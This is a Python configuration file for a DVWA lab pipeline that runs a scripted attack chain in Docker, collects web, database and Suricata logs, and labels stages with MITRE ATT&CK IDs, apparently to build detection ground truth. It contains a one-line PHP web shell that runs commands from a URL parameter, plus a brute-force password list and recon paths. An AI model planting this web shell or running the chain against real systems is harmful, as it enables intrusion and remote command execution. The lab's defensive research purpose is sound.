"""
Shared configuration for the DVWA lab / attack-chain / log-collection pipeline.

Everything else in this project imports from here so the whole lab can be
retargeted (host, subnet, security level, credentials) by editing one file.
"""
import os
from pathlib import Path

# --- Paths -------------------------------------------------------------
ROOT_DIR = Path(__file__).resolve().parent
DATA_DIR = ROOT_DIR / "data"
EXPORT_DIR = DATA_DIR / "exports"
APACHE_LOG_DIR = DATA_DIR / "dvwa_logs" / "apache2"
MYSQL_LOG_DIR = DATA_DIR / "dvwa_logs" / "mysql"
SURICATA_LOG_DIR = DATA_DIR / "suricata"
GROUND_TRUTH_FILE = DATA_DIR / "ground_truth.jsonl"
ALERTS_DB = DATA_DIR / "alerts.db"

# --- Operational (Log4j-style) logging -------------------------------------
# This is the pipeline's OWN runtime logging (startup, parse errors, alert
# throughput, ...) -- distinct from the alert *data* itself, which lives in
# ALERTS_DB. See logging_setup.py.
LOG_DIR = DATA_DIR / "logs"
COLLECTOR_LOG_FILE = LOG_DIR / "collector.log"
CORRELATION_EXPORT_LOG_FILE = LOG_DIR / "correlation_export.log"

for _d in (DATA_DIR, EXPORT_DIR, APACHE_LOG_DIR, MYSQL_LOG_DIR, SURICATA_LOG_DIR, LOG_DIR):
    _d.mkdir(parents=True, exist_ok=True)

# --- Target (DVWA) -------------------------------------------------------
DVWA_HOST = os.environ.get("DVWA_HOST", "127.0.0.1")
DVWA_PORT = int(os.environ.get("DVWA_PORT", "80"))
DVWA_BASE_URL = f"http://{DVWA_HOST}:{DVWA_PORT}"

DVWA_ADMIN_USER = os.environ.get("DVWA_ADMIN_USER", "admin")
DVWA_ADMIN_PASS = os.environ.get("DVWA_ADMIN_PASS", "password")

# low | medium | high | impossible
DVWA_SECURITY_LEVEL = os.environ.get("DVWA_SECURITY_LEVEL", "low")

# --- Docker network (must match docker-compose.yml) -----------------------
DOCKER_NETWORK_NAME = "dvwa_net"
DOCKER_SUBNET = "172.28.0.0/24"
DVWA_CONTAINER_IP = "172.28.0.10"

# --- Suricata --------------------------------------------------------------
# Interface Suricata listens on when run on the HOST watching the docker
# bridge for DOCKER_NETWORK_NAME. Populated/overridden by
# deployment/setup_suricata.sh (it prints the actual bridge, e.g. br-xxxxx).
SURICATA_INTERFACE = os.environ.get("SURICATA_INTERFACE", "auto")
SURICATA_EVE_JSON = SURICATA_LOG_DIR / "eve.json"

HOME_NET = DOCKER_SUBNET

# --- Attack chain ------------------------------------------------------
# Small, self-contained wordlists so the lab has zero external wordlist
# dependencies (no rockyou.txt required). Extend these for more realistic
# / longer episodes.
BRUTE_FORCE_USERNAMES = ["admin", "administrator", "root"]
BRUTE_FORCE_PASSWORDS = [
    "123456", "letmein", "changeme", "test", "dvwa",
    "qwerty", "admin123", "password",  # correct DVWA default is last-ish
]

RECON_PATHS = [
    "robots.txt", "README.md", "phpinfo.php", "config/",
    "login.php", "setup.php", "security.php", "vulnerabilities/",
    "hackable/", "hackable/uploads/", ".git/HEAD", "backup.zip",
    "admin/", "docs/", "CHANGELOG.md", "phpmyadmin/",
]

WEBSHELL_FILENAME = "shell.php"
WEBSHELL_PHP_SOURCE = "<?php system($_GET['cmd']); ?>\n"

# MITRE ATT&CK mapping used for ground-truth labeling of each attack stage.
STAGE_MITRE_MAP = {
    "recon": {"tactic": "TA0043", "technique": "T1595"},
    "bruteforce": {"tactic": "TA0006", "technique": "T1110"},
    "sqli": {"tactic": "TA0006", "technique": "T1190"},
    "upload_rce": {"tactic": "TA0002", "technique": "T1505.003"},
    "c2_discovery": {"tactic": "TA0007", "technique": "T1082"},
    "exfiltration": {"tactic": "TA0010", "technique": "T1041"},
}
